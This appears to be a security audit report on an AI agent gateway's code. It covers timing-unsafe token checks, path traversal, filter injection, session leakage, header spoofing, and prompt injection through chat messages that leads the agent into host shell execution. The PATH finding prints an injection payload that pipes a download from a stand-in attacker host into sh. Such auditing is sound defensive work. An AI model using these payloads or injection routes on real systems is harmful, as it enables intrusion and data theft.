title: Non-Constant-Time Token Comparison in Gateway Auth
description: The token-mode authentication branch in authorizeGatewayConnect() uses JavaScript strict equality (connectAuth.token !== auth.token) rather than the timing-safe safeEqual() helper. A network-adjacent attacker can exploit timing differences to recover the gateway token character by character. The password-mode branch on line 189 correctly uses safeEqual(), confirming the developer was aware of the requirement but missed the token branch.
recommendation: Replace `connectAuth.token !== auth.token` with `!safeEqual(connectAuth.token, auth.token)`. The safeEqual helper using timingSafeEqual is already defined at line 31-34 of the same file.
evidence: Line 175 uses `!==` for token comparison. Line 189 in the same file uses `!safeEqual(password, auth.password)` for the equivalent password comparison. The asymmetry is confirmed by reading src/gateway/auth.ts directly: password mode calls safeEqual(); token mode does not.

title: Non-Constant-Time Hook Token Comparison
description: The hooks HTTP handler in server-http.ts authenticates callers by comparing the extracted hook token with the configured token using `token !== hooksConfig.token` (strict equality). This is a timing side-channel vulnerability identical to the gateway auth token issue. An attacker with repeated access to the hooks endpoint can time responses to brute-force the hook token, which then grants the ability to trigger arbitrary agent jobs or wake the gateway.
recommendation: Use timingSafeEqual (via a helper like safeEqual from src/gateway/auth.ts) to compare the token. Import and reuse the existing safeEqual helper or define a parallel one for the hooks handler.
evidence: Grep across src/ confirms `token !== hooksConfig.token` at src/gateway/server-http.ts:72 for hooks auth, while the password auth path in auth.ts line 189 correctly uses safeEqual. Neither the hooks extraction nor the comparison path uses a timing-safe primitive.

title: Hook Token Exposed in URL Query Parameter
description: The extractHookToken() function in src/gateway/hooks.ts accepts the hooks authentication token via the ?token= URL query parameter as a fallback after checking Authorization: Bearer and X-Clawdbot-Token headers. Query parameters are routinely captured in HTTP access logs, proxy logs, Tailscale logs, CDN logs, browser history, and Referer headers. A stolen hooks token allows an attacker to trigger arbitrary agent jobs or wake the gateway with attacker-controlled messages.
code_snippet:
const queryToken = url.searchParams.get('token');
if (queryToken) return queryToken.trim();
recommendation: Remove the ?token= query-parameter fallback from extractHookToken(). Require callers to use the Authorization: Bearer or X-Clawdbot-Token header exclusively. If backward compatibility requires keeping query-param support, log a deprecation warning and document the log-exposure risk prominently.
evidence: src/gateway/hooks.ts lines 56-57 confirm the ?token= fallback. Lines 44-55 show the Bearer and X-Clawdbot-Token header paths are checked first, making ?token= a third-tier option that many callers may use without understanding the logging risk.

title: Prompt Injection via Messaging Channels Leading to Arbitrary Shell Execution
description: The exec tool in bash-tools.exec.ts spawns arbitrary shell commands supplied by the LLM agent. When a sender is allowlisted under tools.elevated.allowFrom and sends a crafted message, the agent can be prompted to run any shell command on the host system. Because LLMs cannot reliably distinguish legitimate instructions from injected instructions embedded in user messages, any allowlisted sender (or any sender if allowFrom contains '*') can achieve host-level code execution via prompt injection. The sandbox is not the default, and elevated mode runs with security='full' (line 349), bypassing allowlist and approval checks.
recommendation: Apply defence-in-depth: (1) Require Docker sandbox for all exec tool invocations by default (tools.exec.host=sandbox). (2) Never use '*' in tools.elevated.allowFrom; enforce this at config load time, not only via a voluntary audit. (3) Set ask=always so every elevated exec requires interactive approval. (4) Add a system prompt directive that explicitly forbids the agent from executing commands provided in user messages.
evidence: bash-tools.exec.ts lines 341-349 show that when elevated=true, host is forced to 'gateway' and security to 'full', bypassing all allowlist checks and approval gates. Lines 553-614 show spawn() called with params.command passed directly to the shell (-c flag). The command originates from LLM tool-use output with no sanitization between the message channel input and execution.

title: Config $include Path Traversal - No Boundary Enforcement
description: The $include directive in src/config/includes.ts resolves absolute paths as-is and resolves relative paths relative to the current config file's directory. There is no check that the resolved path stays within the config directory (~/.clawdbot/). An attacker with write access to any config file or include file can point $include at /etc/passwd, ~/.ssh/authorized_keys, ~/.clawdbot/agents/*/agent/auth-profiles.json, or any attacker-controlled file. When the target is parsed as JSON5, the error message may reveal file contents; if it parses successfully, its values get merged into the configuration.
recommendation: After resolving and normalizing the path, assert that the result starts with the config directory (path.normalize(configDir) + path.sep). Reject any include path that resolves outside the config directory. Example: if (!resolvedPath.startsWith(allowedRoot)) throw new ConfigIncludeError('Include path outside allowed directory', includePath);
evidence: src/config/includes.ts lines 178-183 show that absolute paths are accepted without any boundary check. No guard exists between the resolved path and readFile(). The existing controls (MAX_INCLUDE_DEPTH=10, circular detection) do not prevent out-of-tree reads. A config file containing `{ "$include": "/etc/passwd" }` would be parsed by JSON5, and any valid JSON5 content there would be merged into the config.

title: PATH Injection via Attacker-Controlled env.PATH in Docker Exec Shell Command
description: buildDockerExecArgs() in bash-tools.shared.ts constructs a shell string by interpolating params.env.PATH directly into a `export PATH="..."; ` prefix that is passed to `sh -lc`. If an attacker can influence the PATH environment variable supplied to the exec tool (e.g., via a crafted env object in the tool call JSON), they can inject shell syntax that breaks out of the quoted context and executes arbitrary commands inside the Docker container. The LLM can pass arbitrary values in the env parameter of the exec tool schema.
recommendation: Do not build a shell string by string-interpolation of untrusted values. Instead, pass PATH as a Docker -e environment variable (already done for other env vars on line 61) and remove the manual pathExport prefix. If the login-shell PATH reset is genuinely a problem, prepend PATH via a Docker --env flag rather than via sh -c string construction.
evidence: src/agents/bash-tools.shared.ts line 67 interpolates params.env.PATH directly into the shell command string without quoting or escaping. A value like `/bin"; curl https://attacker.com/exfil | sh; echo "` would escape the double-quoted context. The exec tool schema (bash-tools.exec.ts lines 116-118) accepts an arbitrary `env: Record<string, string>` from the LLM, and line 373 merges it into the final environment that reaches buildDockerExecArgs.

title: LanceDB SQL Injection via Interpolated ID in Memory Delete
description: The MemoryDB.delete() method in extensions/memory/index.ts validates the id parameter with a UUID regex and then interpolates it into a LanceDB filter expression using single-quote string concatenation: `id = '${id}'`. While the UUID regex (lines 134-136) acts as a guard against SQL injection from direct tool calls, the regex uses the /i flag for case-insensitive matching. More importantly, if the id field ever originates from an untrusted source (e.g., from LanceDB query results that could contain manipulated data, or if the UUID validation is bypassed), single-quote injection into LanceDB filter expressions is directly possible.
recommendation: Use LanceDB parameterized filter API if available, or at minimum verify LanceDB's filter escaping behavior. The UUID regex is a reasonable input validation control; however the interpolation pattern is architecturally fragile. Consider using LanceDB's native delete-by-id API if it accepts a UUID parameter without string concatenation.
evidence: extensions/memory/index.ts lines 134-139 show UUID validation followed by direct string interpolation into the delete filter. The regex does prevent the most obvious injection from external callers. The vulnerability is lower severity because: (1) the regex does filter most injections, (2) memory IDs come from randomUUID() at store time. The risk increases if IDs are ever passed from external input paths without the regex gate.

title: Cross-User Session Context Leakage via Default dmScope=main
description: When session.dmScope is set to 'main' (the documented default), all DM senders share the same agent session. The conversation history of user A is present in the context window when user B sends a DM to the bot. The LLM may include user A's sensitive data in responses to user B. This is an architectural default-insecure configuration: users must explicitly set dmScope=per-channel-peer to achieve isolation, but the security audit only warns rather than requiring it.
code_snippet: // session.dmScope defaults to 'main' - all DM senders share one session
recommendation: Change the default value of session.dmScope to 'per-channel-peer'. If backward compatibility requires keeping 'main' as an option, add a mandatory warning on startup when multiple senders are allowlisted with dmScope=main, or auto-set dmScope=per-channel-peer when allowFrom lists are non-empty.
evidence: THREAT-010 in the threat model describes the confirmed behavior. The threat model notes the default is the insecure setting. The security audit code at src/security/audit.ts warns but does not enforce the safer configuration. The zod schema (src/config/zod-schema.session.ts) and session routing logic share context when dmScope=main.

title: Tailscale Header Spoofing When Gateway Bound to Non-Loopback Address
description: The gateway accepts Tailscale identity headers (tailscale-user-login, x-forwarded-for, x-forwarded-proto, x-forwarded-host) and grants authenticated access when allowTailscale=true. The guard isTailscaleProxyRequest() checks that the TCP socket remote address is loopback AND all three forwarding headers are present. This correctly prevents spoofing in a loopback-only binding. However, if the gateway is bound to LAN (0.0.0.0) and a second reverse proxy (nginx, Caddy) sits in front of the gateway on the same host, that proxy's loopback-forwarded requests could carry attacker-injected Tailscale headers, bypassing authentication.
recommendation: Add an audit check that flags the combination of allowTailscale=true with bind=lan/auto/custom without a token or password fallback as a critical finding. Document that placing any non-Tailscale reverse proxy in front of a Tailscale-auth gateway voids the security guarantee. Consider adding a configurable allowlist of source IPs trusted to deliver Tailscale headers.
evidence: auth.ts lines 97-100 show isTailscaleProxyRequest() relies solely on loopback socket address and forwarding headers. If a non-Tailscale reverse proxy runs on the same host and forwards requests with a loopback source address, an attacker who can reach that proxy can inject tailscale-user-login headers. The code at lines 142-162 shows that when allowTailscale=true and mode=none, the Tailscale path is the only gate.
